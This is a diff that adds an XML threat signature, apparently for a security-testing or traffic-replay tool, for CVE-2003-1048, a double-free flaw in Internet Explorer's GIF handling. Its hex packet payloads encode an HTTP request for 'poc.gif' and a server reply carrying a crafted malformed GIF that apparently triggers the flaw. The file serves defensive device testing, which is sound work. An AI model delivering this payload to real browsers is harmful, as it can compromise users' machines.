@@ -1,0 +1,96 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Microsoft Internet Explorer Malformed GIF File Double Free Vulnerability"/>
+    <EngDesc display="true" value="A double free vulnerability exists in the way Microsoft Internet Explorer handles images of the GIF file format. This vulnerability can be exploited by enticing a user to view a web page or email message containing a specially crafted .gif file. Successful exploitation can lead to a client compromise and possible remote code execution."/>
+    <Intent display="true"/>
+    <Protocol display="true" value="HTTP"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Microsoft"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Microsoft_Microsoft_Internet_Explorer"/>
+      <item value="Microsoft_Microsoft_Windows"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Microsoft_Internet_Explorer_5.01"/>
+      <item value="Microsoft_Internet_Explorer_5.01_SP1"/>
+      <item value="Microsoft_Internet_Explorer_5.01_SP2"/>
+      <item value="Microsoft_Internet_Explorer_5.01_SP3"/>
+      <item value="Microsoft_Internet_Explorer_5.01_SP4"/>
+      <item value="Microsoft_Internet_Explorer_5.5"/>
+      <item value="Microsoft_Internet_Explorer_5.5_SP1"/>
+      <item value="Microsoft_Internet_Explorer_5.5_SP2"/>
+      <item value="Microsoft_Internet_Explorer_6.0"/>
+      <item value="Microsoft_Internet_Explorer_6.0_SP1"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="FSC20040803-01"/>
+    <CVEID display="true" value="CVE-2003-1048"/>
+    <bugtraqID display="true" value="8530"/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value="ThreatEx Team"/>
+    <ID display="true" value="4586fd11d3e7e2afac4d5b6fb7903c2c"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="true"/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="True"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value=""/>
+    <Authentication display="false" value=""/>
+    <ConfImpact display="false" value=""/>
+    <IntegImpact display="false" value=""/>
+    <AvailImpact display="false" value=""/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value="normal"/>
+    <LastModified display="false" value="633603589812812500"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value="B"/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value="1"/>
+    <Regex display="false" value=""/>
+    <Created value="1213652360" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="K"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="L"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="M"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="N"/>
+    <NamedVar name="HTTPdestPort" type="ImperfectControls.Port" value="null" index="O"/>
+  </Variables>
+  <Loops>
+    <for index="D">
+      <for index="K"/>
+      <for index="L"/>
+      <for index="M"/>
+      <for index="N"/>
+      <for index="O"/>
+    </for>
+    <for index="F"/>
+  </Loops>
+  <PostScript/>
+  <Output index="D" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="01A7" Identification="1F8B" FragmentOffset="0000" TTL="80" Protocol="06" HeaderChecksum="C30C" srcIP="$sourceIP" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="@random(1026,65535)" destPort="$HTTPdestPort" SeqNumber="9B12A774" AckNumber="00D20C83" HeaderLength="05" WindowSize="FFFF" Checksum="5409" UrgentPointer="0000" Options="" Payload="474554202F6769662F706F632E67696620485454502F312E310D0A4163636570743A20696D6167652F6769662C20696D6167652F782D786269746D61702C20696D6167652F6A7065672C20696D6167652F706A7065672C206170706C69636174696F6E2F766E642E6D732D706F776572706F696E742C206170706C69636174696F6E2F766E642E6D732D657863656C2C206170706C69636174696F6E2F6D73776F72642C206170706C69636174696F6E2F782D73686F636B776176652D666C6173682C202A2F2A0D0A4163636570742D4C616E67756167653A20656E2D75730D0A4163636570742D456E636F64696E673A20677A69702C206465666C6174650D0A557365722D4167656E743A204D6F7A696C6C612F342E302028636F6D70617469626C653B204D53494520362E303B2057696E646F7773204E5420352E303B202E4E455420434C5220312E312E34333232290D0A486F73743A2031302E322E312E39320D0A436F6E6E656374696F6E3A204B6565702D416C6976650D0A0D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1">
+    <Output index="F" Count="">
+      <Ethernet srcMac="" destMac="" pktType="0800">
+        <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="014F" Identification="CD06" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="55E9" srcIP="" destIP="" options="" CE="false" DF="true" MF="false">
+          <TCP srcPort="" destPort="" SeqNumber="00D20C83" AckNumber="9B12A8F3" HeaderLength="05" WindowSize="1920" Checksum="02EC" UrgentPointer="0000" Options="" Payload="485454502F312E3120323030204F4B0D0A446174653A205765642C2030342041756720323030342030313A35333A323720474D540D0A5365727665723A204170616368652F322E302E343920284665646F7261290D0A4C6173742D4D6F6469666965643A205765642C2030342041756720323030342030313A35333A303820474D540D0A455461673A20223161383464342D32662D3462623036393030220D0A4163636570742D52616E6765733A2062797465730D0A436F6E74656E742D4C656E6774683A2034370D0A436F6E6E656374696F6E3A20636C6F73650D0A436F6E74656E742D547970653A20696D6167652F6769660D0A0D0A47494638376110001000800000FFFFFFFFFFFF2C000000001000100000000E848FA9CBED0FA39CB4DA8BB33E05003B" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IP>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
